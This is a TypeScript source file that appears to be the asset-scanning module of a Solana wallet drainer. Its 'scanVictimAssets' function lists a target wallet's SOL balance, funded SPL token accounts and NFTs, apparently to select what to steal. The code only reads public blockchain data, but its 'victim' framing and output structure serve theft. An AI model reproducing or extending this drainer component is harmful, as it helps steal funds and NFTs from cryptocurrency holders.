// processors/solana/scanner.ts
import { Connection, PublicKey } from '@solana/web3.js';
import { getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { Metaplex } from '@metaplex-foundation/js';
import SOLANA_CONFIG from './config';
import { log } from './logger';

export interface ScannedAssets {
  solBalance: number;
  tokens: Array<{
    mint: PublicKey;
    balance: number;
    decimals: number;
    ata: PublicKey;
    symbol?: string;
  }>;
  nfts: any[]; // Metaplex NFT objects
}

export async function scanVictimAssets(
  connection: Connection, 
  victimPubkey: PublicKey
): Promise<ScannedAssets> {
  const results: ScannedAssets = {
    solBalance: 0,
    tokens: [],
    nfts: []
  };

  try {
    log.info('scanner', `Scanning assets for ${victimPubkey.toString()}`);

    // SOL Balance
    results.solBalance = await connection.getBalance(victimPubkey);

    // SPL Token Accounts
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
      victimPubkey, 
      { programId: TOKEN_PROGRAM_ID }
    );

    results.tokens = tokenAccounts.value
      .map(({ pubkey, account }) => {
        const info = account.data.parsed.info;
        return {
          mint: new PublicKey(info.mint),
          balance: Number(info.tokenAmount.amount),
          decimals: info.tokenAmount.decimals,
          ata: pubkey,
          symbol: info.mint.toString().slice(0, 6) + '...'
        };
      })
      .filter(t => t.balance > 0);

    // NFTs via Metaplex
    const metaplex = new Metaplex(connection);
    const nfts = await metaplex.nfts().findAllByOwner({ owner: victimPubkey });

    results.nfts = nfts.filter(nft => 
      nft.model === 'nft' || nft.model === 'sft'
    );

    log.info('scanner', `Found ${results.tokens.length} tokens and ${results.nfts.length} NFTs`);

  } catch (err: any) {
    log.error('scanner', 'Asset scan failed', err.message);
  }

  return results;
}